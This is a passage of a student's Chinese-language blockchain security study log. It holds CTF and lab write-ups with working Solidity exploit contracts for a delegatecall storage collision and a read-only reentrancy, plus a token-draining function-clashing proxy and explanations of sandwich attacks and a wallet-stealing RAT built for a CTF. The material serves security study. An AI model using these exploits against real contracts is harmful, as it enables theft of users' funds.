---
timezone: UTC+8
---

# Cauliweak9

**GitHub ID:** Cauliweak9

**Telegram:** @暂无

## Self-introduction

深大信安协会现任区块链方向负责人，了解基础的智能合约攻击/防御手段和Web3钓鱼手段，正在学习DeFi协议合约实现以及blob相关EIP，希望能通过此次共学认识更多志同道合的人，学到更多前沿技术

## Notes

<!-- Content_START -->

# 2025-08-29
<!-- DAILY_CHECKIN_2025-08-29_START -->
应该是最后一天了，拿RemedyCTF的题目结尾吧，这次选个难点的：Joe's Lending Mirage

\> 对着榜一wp看的，确实很复杂

整个题目是一个基于Trader Joe V2 Liquidity Book的借贷协议，存在健康因子（1.25）以让仓位维持125%抵押率，借贷因子（0.8）以保证用户只能借贷抵押品价值80%的资金，年利率5%等功能

整个存款、借贷和健康检查都相当健全，但是`JoeLending.sol`中`_update`函数`_reentrancyGuardEntered()`返回true的时候不执行健康检查，而这就是整道题目的漏洞点

我们知道在存款的时候会出发重入守卫，同时也会触发ERC1155的回调函数，因此这个时候我们就可以将抵押品转移给另一个合约，从而使用同一批抵押品进行二次甚至多次借贷，最终提走大量的USDJ

详细的实现就请自行看榜一wp吧，这里就不展开了
<!-- DAILY_CHECKIN_2025-08-29_END -->


# 2025-08-28
<!-- DAILY_CHECKIN_2025-08-28_START -->
今天也在接着给26届新生出题，大方向是Web3的取证和溯源，不过因为新生赛还没有开赛暂时不能透露具体信息，不过可以简单写点思路

目前是在用Python写一个RAT（远控木马）（\*\*仅用于学习用途，不会发布到网络上也不会公布源码\*\*），攻击者通过该RAT窃取Chrome浏览器的历史记录、Cookie和钱包插件信息（当然，这个RAT的功能不止这些），然后攻击者通过窃取到的Metamask插件信息恢复出了钱包助记词，而且使用该钱包内的地址在公链（使用Sepolia Ethereum模拟真实生产环境）对一个存在漏洞的DeFi合约进行了攻击，在窃取了其资产后进行了资金的转移

目前对于DeFi合约的设计还在考虑中，计划是会使用到Chainlink VRF，同时可能会顺带写一个前端，看个人进度和心情（

预计是10月末或11月初对题目相关细节进行解禁，届时完整的Writeup会在本人博客（\[AuroraCTF2025 Misc 部分Writeup | 9C±Void's Blog\]([https://cauliweak9.github.io/2025/07/04/AuroraCTF2025-Misc-WP/)）公布，目前文章还是上锁的，不公开](https://cauliweak9.github.io/2025/07/04/AuroraCTF2025-Misc-WP/\)）公布，目前文章还是上锁的，不公开)
<!-- DAILY_CHECKIN_2025-08-28_END -->


# 2025-08-26
<!-- DAILY_CHECKIN_2025-08-26_START -->
马上开学了，重新测了一下7月份给26届新生出的题目，发现存在非预期解，所以稍微修改了一下源码和Docker镜像，但是由于新生赛还没有开赛，所以为了防止泄题，现在没法展开解释，只能说是和Anvil`--auto-impersonate`选项导致的任意地址使用有关，从而导致潜在的非预期解

修改方案也很简单，就是直接搬RemedyCTF的infra：在题目部署前后进`anvil_autoImpersonateAccount`的启用和禁用即可
<!-- DAILY_CHECKIN_2025-08-26_END -->


# 2025-08-24
<!-- DAILY_CHECKIN_2025-08-24_START -->
饿了，来个三明治

三明治攻击（Sandwich Attack）一般可以分为2步：抢跑（Front-running）和尾随（Back-running），整个攻击一般是基于AMM（Automated Market Maker，自动化做市商）中对代币换算价格的恒定乘积公`x*y=k`，因此如果有人大量买入/售出某种代币，根据公式会对其它代币的价格产生剧烈波动

同时由于区块链的内存池（Mempool）机制，攻击者可以监测Mempool中的交易从而检测交易的盈利潜力

假如我们有个用户A使用代币X购入了大量的代币Y，那么可以想象代币Y的价格也会水涨船高，因此攻击者B可以通过在A之前购入代币Y，然后由此获利

B不可能预知A什么时候购入，但是B可以通过监测Mempool知道A什么时候发起了交易，然后在监测到的那一个瞬间购入代币Y，同时提出更高的gas费用，这样矿工在将交易打包进区块的时候会先打包B的购入交易，然后才是A的交易，这样B就“先于”A购入代币Y了，从而获利

怎么获利？在A购入后，B马上抛售手中的代币Y，当然gas费用要接近A购入的交易的gas费用，可能需要略高一点，从而将A的交易“夹”在中间，这就是为什么这类攻击被称为“三明治攻击”

当然，Front-running和Back-running远远不止这种情况，还有很多案例，这里不赘述，而且以上的攻击多出现在流动性低的资金池中，因此推荐多在流动性高的资金池中进行大额的交易
<!-- DAILY_CHECKIN_2025-08-24_END -->


# 2025-08-23
<!-- DAILY_CHECKIN_2025-08-23_START -->
已经不知道写啥了，好困啊...

水道VNCTF2025的题目Ekko

\`\`\`Solidity

// contracts/ZDriveContract.sol

// SPDX-License-Identifier: GPL-3.0

// EVM version istanbul

pragma solidity ^0.8.0;

contract ZDriveContract {

uint256 public ZDriveowner;

uint256 public Description;

uint256 private callCounter = 0;

event UsefulEvent(string message);

function setZDriveowner(uint256 _ZDriveowner, uint256_ Description) public {

ZDriveowner = \_ZDriveowner;

Description = \_Description;

callCounter++;

emit UsefulEvent("Happy Chinese New Year!");

}

function getSomeConstantInfo() public pure returns (string memory) {

return "VNCTF2025";

}

}

// contracts/EkkoTimeRewind.sol

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract EkkoTimeRewind {

address public owner;

string constant public saying = "U can do Anything in VNCTF2025";

bytes4 constant setZDriveownerSignature = bytes4(keccak256("setZDriveowner(uint256,uint256)"));

address public rewindBeforeTime;

address public rewindAfterTime;

uint256 public Time0;

uint256 public Time1;

bool private isSetZDriveownerCalled = false;

bool private isSetTimeCalled = false;

address public zDriveContractAddress;

constructor(address \_zDriveContractAddress) {

zDriveContractAddress = \_zDriveContractAddress;

rewindBeforeTime = address(this);

rewindAfterTime = address(this);

owner = msg.sender;

}

function setRewindBeforeTime(uint256 \_Time0) onlyWhitelisted public {

require(!isSetTimeCalled, "setRewindBeforeTime can only be called once");

isSetTimeCalled = true;

Time0 = \_Time0;

}

function setRewindAfterTime(uint256 \_Time1) onlyWhitelisted public {

require(!isSetTimeCalled, "setRewindAfterTime can only be called once");

isSetTimeCalled = true;

Time1 = \_Time1;

}

function isSolved() public view returns (bool) {

return (Time0 != 0 && Time1 != 0 && Time0 > Time1 + 4);

}

function setZDriveowner(bytes\[\] calldata data) public {

require(!isSetZDriveownerCalled, "multicallSetZDriveowner has already been called once");

for (uint256 i = 0; i < data.length; i++) {

bytes memory \_data = data\[i\];

bytes4 selector;

assembly {

selector := mload(add(\_data, 32))

}

if (!isSetZDriveownerCalled && selector == setZDriveownerSignature) {

(bool success,) = zDriveContractAddress.delegatecall(data\[i\]);

require(success, "Error while delegating call to setZDriveowner");

} else {

revert("Invalid selector");

}

}

isSetZDriveownerCalled = true;

}

function setTime(bytes\[\] calldata data) onlyWhitelisted public {

bytes4 rewindBeforeTimeSignature = bytes4(keccak256("setRewindBeforeTime(uint256)"));

bytes4 rewindAfterTimeSignature = bytes4(keccak256("setRewindAfterTime(uint256)"));

for (uint256 i = 0; i < data.length; i++) {

bytes memory \_data = data\[i\];

bytes4 selector;

assembly {

selector := mload(add(\_data, 32))

}

if (!isSetTimeCalled && selector == rewindBeforeTimeSignature) {

(bool success,) = rewindBeforeTime.delegatecall(data\[i\]);

require(success, "Error while delegating call for rewindBeforeTime");

} else if (!isSetTimeCalled && selector == rewindAfterTimeSignature) {

(bool success,) = rewindAfterTime.delegatecall(data\[i\]);

require(success, "Error while delegating call for rewindAfterTime");

} else {

revert("Invalid selector");

}

}

}

modifier onlyWhitelisted() {

require(msg.sender == owner, "Not whitelisted");

\_;

}

}

\`\`\`

这题的isSolved很简单：让Time0和Time1都经过设置，且Time0要大于Time1+4，那么我们发现题目合约中能够进行修改的所有函数都是经过`onlyWhitelisted`修饰过的，也就是说我们首先得获取到owner权限才能进行下一步操作

在进行进一步的做题之前，首先我们需要了解delegatecall的机制，不过有点麻烦，我这里也不是很想展开讲，各位可以自己搜一下资料了解delegatecall

这里获取owner权限运用的正是“保留上下文”，这里我们利`setZDriveOwner`函数对ZDriveContract进行delegatecall的时候，\*\*修改的并不是ZDriveContract的Owner，而是EkkoTimeRewind的Owner\*\*，也就是说我们只需要让传入`_ZDriveowner`是自己就行了，这样我们就在白名单里面了

接下来看setTime相关的操作，我们发现无论如何都只能进行1次设置时间的操作，而这就导致不管修改的是哪个Time，另一个Time就再也无法被修改了，无法满足题目条件，但是我们查看上面获取Owner的时候还能传入一`_Description`，说明我们还会修改EkkoTimeRewind的某一个参数，此时需要注意\*\*Solidity中的constant并不会保存在Storage中，也就是说这里`_Description`修改的其实`rewindBeforeTime`的值！\*\*因此我们在获取Owner的时候传入`_Description`实际上应该是我们的某个合约，这个合约要有一`setRewindBeforeTime`函数，这样我们通`setTime`进行delegatecall的时候就会直接调用到我们自己的合约的函数，这里给出一个简单的攻击合约的例子，目前已经在本地环境通过：（虽然题目私链为Istanbul分叉，我在Cancun分叉测试的，但是两个分叉期间delegatecall本身并没有太多改动）

\`\`\`Solidity

// exp.sol

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

interface EkkoTimeRewind {

function setZDriveowner(bytes\[\] calldata data) external;

function setTime(bytes\[\] calldata data) external;

}

contract Attack{

address public owner;

address public rewindBeforeTime;

address public rewindAfterTime;

uint256 public Time0;

uint256 public Time1;

bool private isSetZDriveownerCalled = false;

bool private isSetTimeCalled = false;

address public zDriveContractAddress;

EkkoTimeRewind Ekko;

constructor(address \_ekko) {

Ekko = EkkoTimeRewind(\_ekko);

}

function attack() public{

// Construct calldata

uint256 ZDriveOwner = uint256(uint160(address(this)));

bytes\[\] memory calldatas = new bytes\[\](1);

calldatas\[0\] = abi.encodeWithSignature("setZDriveowner(uint256,uint256)", ZDriveOwner, ZDriveOwner);

// Gain ownership

Ekko.setZDriveowner(calldatas);

// Construct calldata to set time

calldatas\[0\] = abi.encodeWithSignature("setRewindBeforeTime(uint256)", 11037);

// Set Time0 and Time1 to solve the problem

Ekko.setTime(calldatas);

}

function setRewindBeforeTime(uint256 \_Time0) public{

// Modify time when called with delegatecall

Time0 = \_Time0 + 11037;

Time1 = \_Time0;

}

}

\`\`\`

前面的参数完全照搬是为了和题目合约对齐，在合约部署完成之后调用attack即可，具体的和题目RPC交互的Web3py代码我就不写了
<!-- DAILY_CHECKIN_2025-08-23_END -->

# 2025-08-21

摸鱼，把一年半之前挖的坑（CTF区块链入门指南）给埋上了：[CTF的Blockchain方向入门指南...？ | 9C±Void's Blog](https://cauliweak9.github.io/2024/04/28/Blockchain-Guide/)

唯一的遗憾就是不会Move啊Rust啊Cairo啊啥的，只能写点Solidity了〒▽〒

# 2025-08-20

昨天开摆了，今天也想摆，水道题吧，前几天LilCTF的区块链题目“生蚝的宝藏”

> 其实放题当天中午12点半就做出来了（因为在线下坐牢没事干），不过因为是借的别人的靶机打的所以也就没交（借我靶机的是我学弟，他没有提交本题flag，因此不存在影响比赛公平性的情况）

简单来说就是通过Ethereum JSON-RPC API获取指定合约的Runtime Bytecode，然后反编译进行逆向分析（Dedaub我的神），基本上扔给AI都能知道是进行了一次异或操作，而异或操作可逆，所以找到key和密文就行了

密文好找：直接根据动态数组在Storage的存储方式去读就行了（没记错的话index是固定的0x5d）；而key作为constant不是很好读，好在Dedaub能搞出TAC（Three Address Code），里面能搞到key，直接异或然后调用验证函数就行了

具体的Writeup可以自行去官方Writeup（[Docs](https://lil-house.feishu.cn/wiki/N7EIwqpoEiVngqkV8rzcgPB9nPg)）中查看，此处就不过多赘述了

---

OK，以上为预期解，接下来就来到我们的非预期解时间~

> 可能有人会觉得有点事后诸葛亮的成分在，我也是在预期解完成本题后才发现的非预期，不过这里还是写上吧
> 此处使用`ciphertext`指代存放在数组中的密文，`encrypt()`指代完整的异或加密函数

反编译啥的不能省，但是我们可以发现验证函数的逻辑是比对`keccak256(ciphertext)`和`keccak256(encrypt(input))`这两者，而`ciphertext`是在`constructor(string memory initializetext)`中通过`encrypt(initializetext)`得到的，因此我们的目标就发生了偏移：我们不需要知道`encrypt`具体在干啥，我们只需要知道`constructor`传入了什么就行

题目很贴心地给了合约创建的txn hash，因此我们可以直接读取交易的完整数据：`cast rpc eth_getTransactionByHash 0xtx_hash -r http://106.15.138.99:8545`

最后得到的数据就是完整的合约字节码，包括Constructor Bytecode和Runtime Bytecode，除此之外**最后面是传入`constructor`的参数值**，也正是我们想要的东西（这里给出我当时做题时得到的snippet）：

```
...600052601160045260246000fd5b506001019056fea264697066735822122021ebf24dde1fd17fcdd77fedee95a480bc9861c8c6717cb4263cf1512b7e7bc464736f6c634300080900330000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002e34353431333534383435343933313566353536653634333337323566373434383435356637333333343033663764000000000000000000000000000000000000
```

最后这段很明显是一个`string memory`的类型，其中`2e`表示了string的长度，后面的就是传入的string，因此我们直接把字符串传进验证函数里就行了

由此我们可以发现，区块链的公开性对于这类题型的摧毁还是挺大的，很多情况都能找到一种“奇技淫巧”脱离出题人的预期解，果然出题时还得好好预防这方面的操作

总的来说作为中等难度还算OK，只是一开始啥源码都不给这一点确实拦住了很多人，很庆幸当时很迅速地做出了直接使用cast获取字节码这一操作，节省了很多无用时间

# 2025-08-18

摸鱼，随便写点

一些常见的可升级代理合约使用的代理模式：

- 简单代理模式
- 透明代理模式
- UUPS代理模式
- 信标代理模式
- 最小代理模式
- 钻石代理模式

前面也已经写了一点简单代理模式的函数碰撞问题，除此之外还有delegatecall经典的存储碰撞问题，总之问题很多

透明代理模式则是在Proxy的fallback中检测`msg.sender`，admin发送的call永远不会被delegate，而其它地址永远都会被delegate

但是这也有很多问题，比如admin也想调用Implementation，而这会直接导致revert，所以有个方案是将admin权限转移给另一个地址App，让App进行admin操作，但是这样会消耗大量gas，而且用户无法访问Proxy的读取方法了，比如读取Implementation的地址等

UUPS代理模式相比前两者，其合约升级功能被放在Implementation中而非Proxy中，这样Proxy就是一个单纯的转发call的合约，从而减少gas消耗，同时由于所有函数功能都在Implementation中，因此也避免了函数碰撞的问题

信标代理模式是在多个Proxy使用同一个Implementation时的一个可升级解决方案：通过将多个Proxy指向一个Beacon，然后Beacon进行Implementation的升级操作，这样就可以避免在Implementation升级的时候挨个修改Proxy

最小代理模式很简单，就是从字节码层面压缩Proxy的功能，使其只保留最简单的delegatecall方法，从而减少gas消耗

钻石代理合约则是一个可以指向多个Implementation的一个Proxy，其中每个Implementation被称为钻石面（facet），但是相比于前面的代理模式，钻石代理模式支持模块化的调用，即它能够将用户限制到只和特定函数交互而非整个合约进行交互，当然，由于其复杂性，它的安全审计问题也很困难

# 2025-08-17

这几天准备开始细看代理模式，今天就随便放个引子好了

众所周知，以太坊中对合约函数的调用是通过函数选择器（Function Selector）进行函数的区分的，计算方法也很简单：`bytes4(keccak256("Function Selector String"))`，不过由于这个选择器长度只有4个字节，那么会有很大概率存在哈希碰撞问题，也就是说一个合约中可能存在两个函数，它们的函数选择器是一样的，此时Solidity编译器在编译合约的时候会直接抛出`TypeError`错误，由此杜绝同一个合约中函数调用模糊的问题

一切都非常美好，直到简单代理可升级合约的出现：我们都知道这类合约分为专门存储数据的Proxy（代理）和专门实现逻辑的Implementation（实现），一般对数据的操作都是在Proxy上通过delegatecall调用Implementation上的函数，而Proxy有的时候也会有自己的一些函数，那么问题来了：假如Proxy上和Implementation上分别存在一对Selector相同的函数，会发生什么呢？

一般来说，Proxy的delegatecall放在`fallback()`中，这是因为Proxy并没有这些函数，所以合约遇到了**自己没有的**Selector就会自动调用`fallback()`，那么如果Proxy它有呢？那肯定是优先调用Proxy中对应的函数，而如果我在这个函数中进行一些恶意操作，那么用户在使用合约的时候就会遭受损失

接下来给一个样例（出自[Beware of the proxy: learn how to exploit function clashing - Security - OpenZeppelin Forum](https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070)）：

```solidity
pragma solidity ^0.5.0;

contract Proxy {
    
    address public proxyOwner;
    address public implementation;

    constructor(address implementation) public {
        proxyOwner = msg.sender;
        _setImplementation(implementation);
    }

    modifier onlyProxyOwner() {
        require(msg.sender == proxyOwner);
        _;
    }

    function upgrade(address implementation) external onlyProxyOwner {
        _setImplementation(implementation);
    }

    function _setImplementation(address imp) private {
        implementation = imp;
    }

    function () payable external {
        address impl = implementation;

        assembly {
            calldatacopy(0, 0, calldatasize)
            let result := delegatecall(gas, impl, 0, calldatasize, 0, 0)
            returndatacopy(0, 0, returndatasize)

            switch result
            case 0 { revert(0, returndatasize) }
            default { return(0, returndatasize) }
        }
    }
    
    // This is the function we're adding now
    function collate_propagate_storage(bytes16) external {
        implementation.delegatecall(abi.encodeWithSignature(
            "transfer(address,uint256)", proxyOwner, 1000
        ));
    }
}
```

实际上，`burn(uint256)`和`collate_propagate_storage(bytes16)`两个函数的选择器是相同的，因此如果我们想要调用Implementation中的`burn(1)`，实际上会先首先调用Proxy的`collate_propagate_storage(0x01)`，然后根据合约逻辑调用Implementation的`transfer(proxyOwner, 1000)`，本来只想销毁1个ERC20的，这下倒好，1000个币全给转走了

以上就是所谓的函数碰撞攻击（Function Clashing Exploitation），也正是因为有这类攻击被发现，现在已经出现了一个专门应对这种攻击的代理模式：透明代理模式（Transparent Proxy Pattern），至于细节等之后再写

# 2025-08-15

昨天坐牢太累了，回酒店倒头就睡了，今天接着坐牢也没啥空学，随便写点吧，这次是EIP-4844

以太坊L1上的交易消耗大量gas这件事已经是显然的，所以出现了大量L2 Rollup对这一点进行改善，但是L2在打包数据并发送至L1时，存储大量数据本身成本就很高，因此提出了Blob Transaction的概念

Blob（Binary Large Object）数据大小至少为4096*32字节，数据仅保留4096个Epoch，之后会被自动删除以降低存储成本，同时Blob数据被保存在共识层，因此EVM无法直接访问此数据

新提出的Blob Transaction交易类型号为0x03，它的`TransactionPayload`为：

```
[chain_id, nonce, max_priority_fee_per_gas, max_fee_per_gas, gas_limit, to, value, data, access_list, max_fee_per_blob_gas, blob_versioned_hashes, y_parity, r, s]
```

基本和EIP-1559类似，只是多加了两个和blob相关的值：

- `max_fee_per_blob_gas`：用户愿意为每单位Blob Gas支付的最高费用
- `blob_versioned_hashes`：Blob承诺的版本化哈希数组，格式为`0x01`+KZG承诺的sha256后31字节

由于Blob无法被EVM直接访问，因此需要使用一点密码学魔法（KZG多项式承诺）来验证数据的完整性和可用性，为此以太坊在Dencun硬分叉加入了`BLOBHASH`和预编译的`POINT_EVALUATION_PRECOMPILE_ADDRESS`来进行Blob完整性验证

Blob具有一个独立的Gas市场，其中每个Blob固定消耗0x20000 Gas，同时每个区块Blob目标数只有3个（最多6个）

# 2025-08-13

这几天没啥时间，随便水点东西得了

放篇我自己的博客好了，刚刚稍微补充了一些东西，至于这篇博客的续集等10月末再更新了：[区块链靶机小记 | 9C±Void's Blog](https://cauliweak9.github.io/2025/05/28/blockchain-docker-instance/)，有点长，这里就不展开了，you're welcome

# 2025-08-12

这一周刚好从今天开始连续5天都有事没啥空，希望能尽量挤出点时间来水下签到，别似了（笑）

想到自己之前的博客还有坑没填完，这里填一下，之后找个时间从这里填回去，今天就只写一个只读重入（Read-only Reentrancy）攻击吧（其它的重入攻击或多或少写过一点，除了Double Entrypoint）

> 漏洞合约和攻击合约源码来自[DeFiVulnLabs/src/test/ReadOnlyReentrancy.sol at main · SunWeb3Sec/DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/ReadOnlyReentrancy.sol)

本质上重入攻击的攻击点就是在于合约状态变量和现实情况之间的差别，通常是合约状态变量没能赶上现实情况的变化，从而导致攻击者能够利用虚假的变量值进行一些操作

只读重入也是类似的，差别是漏洞合约过分信任被`view`修饰的函数，比如主网上的案例：[Lido: Curve Liquidity Farming Pool Contract | Address: 0xDC24316b...Ea0f67022 | Etherscan](https://etherscan.io/address/0xDC24316b9AE028F1497c275EB9192a3Ea0f67022#code)

假定我们有一个依赖于上面的合约的`get_virtual_price`函数提供奖励的质押合约：

```solidity
// VulnContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract VulnContract {
    IERC20 public constant token = IERC20(LP_TOKEN);
    ICurve private constant pool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function stake(uint amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }

    function unstake(uint amount) external {
        balanceOf[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }

    function getReward() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return reward;
    }
}
```

那么我们可以通过往Pool先`add_liquidity`然后`remove_liquidity`，此时根据Pool源码，我们发现Pool会首先burn掉代币然后进行转账，那么此时由于`total_supply`降低，此时会导致`get_virtual_price`临时升高，最终导致我们的`getReward`返回更多的奖励

中途虚拟价格发生的变化就是这样的表格：

| 阶段   | LP代币总量 | 基础代币余额 | D值              | 虚拟价格                  |
| ------ | ---------- | ------------ | ---------------- | ------------------------- |
| 初始   | X          | Y            | D0               | P0 = D0/X                 |
| 销毁后 | X' = X-ΔX  | Y            | D0               | P1 = D0/(X-ΔX) (临时升高) |
| 转账后 | X-ΔX       | Y-ΔY         | D1 ≈ D0*(X-ΔX)/X | P2 ≈ D0/X (恢复)          |

最终的攻击合约如下：

```solidity
contract ExploitContract {
    ICurve private constant pool = ICurve(STETH_POOL);
    IERC20 public constant lpToken = IERC20(LP_TOKEN);
    VulnContract private immutable target;

    constructor(address _target) {
        target = VulnContract(_target);
    }

    // Stake LP into VulnContract
    function stakeTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into VulnContract",
            pool.get_virtual_price()
        );

        lpToken.approve(address(target), lp);
        target.stake(lp);
    }

    // Perform Read-Only Reentrancy
    function performReadOnlyReentrnacy() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.value, 0];
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        // Log get_virtual_price
        console.log(
            "LP token price before remove_liquidity()",
            pool.get_virtual_price()
        );
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory min_amounts = [uint(0), uint(0)];
        pool.remove_liquidity(lp, min_amounts);
        // Log get_virtual_price
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            pool.get_virtual_price()
        );

        // Attack - Log reward amount
        uint reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
    }

    receive() external payable {
        // receive() is called when the remove_liquidity is called
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            pool.get_virtual_price()
        );
        // Attack - Log reward amount
        uint reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
    }
}
```

还是那句话：Don't trust anyone

# 2025-08-11

昨天写了AA的其中一类方案：升级智能合约钱包，使其能够主动发送交易，那今天就写一下另一类方案吧，就选比较有代表性的EIP-7702吧

> 昨天有关`Bundler`的表述有些不清楚，实际上那些打包的节点并非以太坊RPC节点，它们只是一系列白名单中的实体，它们只负责将打包后的`UserOperation`发送到以太坊节点中，可以简单理解为矿工
>
> 至于zkSync链原生实现的AA这里就不谈了，交易大致流程是一样的，只是`Bundler`同时也是以太坊节点

EIP-7702提出了一个新的交易类型0x04（另外三种交易类型0x01~0x03分别对应EIP-2930，EIP-1559和EIP-4844），该交易类型会修改指定地址`authority`的代码为`0xef0100 || address`，其中`0xef`为EIP-3541中定义的被禁用的操作码，这里用于指代执行该地址（记为A）的代码时和执行一般代码要有所区别：需要读取指定地址（记为B）的代码后再在A的上下文中执行（很显然汇编底层上使用的是`DELEGATECALL`操作码）

整个EIP-7702本质上就是将一个EOA包装成了一个Proxy，而交易类型0x04就是一个`setImplementation`函数，调用EOA地址的代码本质上就是在和一个Proxy交互，本身是挺不错的，不过如果同一个地址通过EIP-7702进行多次代码设置，那么执行代码的时候会不会出现和`delegatecall()`一样的问题呢？比如经典的存储内变量排布问题...

除此之外，由于部署合约时`initCode`是即用即删的，因此实际上我们无法在设置代码的同时进行初始化，而是必须要在设置结束后再额外进行一次初始化，这可能会是一部分额外的gas费用

好消息是经过EIP-7702设置代码的EOA地址，其`EXTCODESIZE`大小固定为23（`len(0xef0100 || address)`），且`CODESIZE`返回的为指定地址`address`的`CODESIZE`，因此本质上extcodesize检查稍微改动一点还是勉强能用的，但是如果攻击者通过汇编构造合约代码的话...那就另当别论了（笑）

根据EIP规范文档，整个EIP-7702交易的Gas费用消耗为`21000 + 16 * non-zero calldata bytes + 4 * zero calldata bytes + 1900 * access list storage key count + 2400 * access list address count`，额外加上`PER_EMPTY_ACCOUNT_COST * authorization list length`以及对交易执行过程中特定地址的冷/热读取费用

说了这么多，实际上整个EIP-7702是一个非常大胆的尝试，因为让EOA本身能够执行代码逻辑这件事就很危险，攻击者可能会通过一系列伪造执行恶意操作（比如设置一个智能钱包，但是你往里面存钱就会调用某个EOA的代码从而窃取虚拟资产之类的），而且本身此方案如果涉及到跨链层面还会有更多问题，因此可能需要额外的EIP进行规范

# 2025-08-10

嘻嘻，昨天口糊了，Pectra使用的是我们的EIP-7702而非EIP-4337（人家现在还只是草案阶段呢，不过确实是被广泛接受了，23年就已经在主网部署了`Entrypoint.sol`）

今天先简单写一点ERC4337吧

###  交易过程的差异

对于一般的EOA账户交易，我们都是使用EOA的私钥对交易数据进行签名，然后账户将这些签名数据发送到以太坊节点进行验证和执行，验证后在链上执行操作

这里就有很多问题：首先就是经典的“私钥即一切”的问题：丢失了私钥那么就彻底丢失了资产以及相关的控制权；同时交易的支付代币只能是ETH，签名算法只能是ECDSA，EOA不够灵活...

因此有人提出了个想法：将Owner（资产持有者），Signer（交易发起者，签署交易）和Gas Payer（手续费支付者）从现有的框架中解耦出来，最终得到的一个结果就是ERC-4337

> 在此之前有EIP-2938及EIP-3074等提出了解决方案，但是有些方案是中心化的，有些则需要从共识层协议进行改动，需要进行硬分叉，而ERC-4337是在原有框架下实现最大程度的AA的一个方案

ERC-4337新提出了一个叫做`UserOperation`的一个类交易结构体，里面包含一系列类似普通交易的参数，比如常规的`sender`和`nonce`之类的，但是其中有三个新的概念：`Bundler`，`PayMaster`和`Factory`，这里我们稍后提到

这里的`UserOperation`需要进行签名，不过是可以以其它的签名方式进行签名的，而不仅仅是ECDSA，在签名后会将签名数据发送到一个独立的内存池（`Alt mempool`），这个内存池只存放`UserOperation`，然后会有一些支持ERC4337的以太坊节点从池中选出若干个`UserOperation`进行打包，这些节点就是`Bundler`（打包者）

> 验证签名合法性的逻辑需要提前编写在AA Wallet（Account Abstract Wallet，账户抽象钱包）中，以便之后验证签名的合法性

目前为止我们的交易还在链下，接下来就要进行链上操作了：`Bundler`在打包后会将这些打包后的交易发送到一个`Entrypoint`合约中进行上链操作，流程如下：

1. 检测AA Wallet是否存在，如果不存在且`initCode`非空则会通过`factory`地址进行一个新AA Wallet的部署
2. 调用AA Wallet的函数验证签名合法性
3. 检测`PayMaster`是否存在抵押在`Entrypoint`的代币（以防止DoS攻击），且`PayMaster`余额是否足以垫付交易
4. 调用`PayMaster`中的函数进行支付检查，比如AA Wallet是否有足够的余额进行交易操作
5. 执行`UserOperation`中的主要逻辑
6. 返还`PayMaster`垫付的费用，并向节点支付打包费用

> 需要注意的是：每条链上的`Entrypoint`合约是唯一的，主网上的合约地址和实现：[Entry Point 0.7.0 | Address: 0x00000000...6f37da032 | Etherscan](https://etherscan.io/address/0x0000000071727De22E5E9d8BAf0edAc6f37da032#code)

通过这种方式，我们可以直接实现自定义签名算法、多签钱包、多笔交易执行、多代币支付手续费等便捷操作，但是由于这种方案一定会发生合约调用，因此gas费会更高，因此其中一个优化方案是利用Layer2

# 2025-08-09

周末了，姑且休息一天，明天再战

随便看了一下账户抽象的一些Approach（文章链接：[Account Abstraction: Past, Present, Future](https://metamask.io/news/account-abstraction-past-present-future)），准备开始啃EIP了，刚好Pectra已经在使用EIP-4337了，说不准还可以实战测试一下

说白了就是用户对持有的资产的管理和行为不够灵活，所以想要实现所谓的“账户抽象”，最终的目的是让**钱包能够执行自定义的代码**，而途径无非就两种：

- 让智能合约能够“主动”发送交易（一般的合约不能主动发送交易，它只是一系列确定且公开的执行逻辑，也就是一个没有电源的电路）
- 让EOA能够执行代码（一般的EOA的`extcodesize`为0，这也是过去判断EOA地址和合约地址的一个重要依据）

至于对每种途径提出的EIP等明天再开始看，现在该睡觉了

# 2025-08-08

今天想摆烂，就不刷题了，想着下周要搞个dApp，干脆顺带把下一届新生赛的题目一起出完好了，没几个月了

今天题目设计的进展也不多，就是跟着Chainlink文档搓了个D100用于NFT抽卡，基本上照搬的，不过只是获取随机数而已，谁还不是套个板子就开始跑呢？（笑）

D100在Ethereum Sepolia上的地址：`0xA6FAca145A93DC2fAcd749B7303ef950ba2A6d81`，已经在Etherscan上Verify了源码，这一个Version还没有添加重置骰子的操作，之后会添加（不然一个人就只能抽1个NFT有点太尴尬了www），后面可能会添加NFT稀有度合成的操作，不过那些都是后面的事了，还得想想在哪个不起眼的地方塞个漏洞进去(o-ωｑ)).oO 

Chainlink VRF这个投骰子耗时挺长的，1分钟，还得想想前端页面该怎么搞才能算合理，~~总不能像碧蓝航线搞个造船时间吧（~~

顺带一提，Remix的Verify插件挺逆天的，需要你传入正确的constructor才能Verify，结果传进去一个差不多1e76的数告诉我Overflow（2**256＞1e78），但是在数前面加个0就好了，气笑了

~~运气不好，自己只抽到个R，笑死~~

# 2025-08-07

我靠昨天看完沪赛的题目睡过去了，好悬没签上到

今天稍微摆个烂，就只看1题吧，RemedyCTF的Lockdown：

> 整个题目给我眼睛都看花了，现在还是有点懵，这题能有23解是不是有点变态了（

整个题目设计了一个能质押NFT并获取质押奖励的市场和一个对应的NFT合约，同时大量使用了安全的运算函数以及重入哨兵，代码量也不小，乍看起来十分唬人

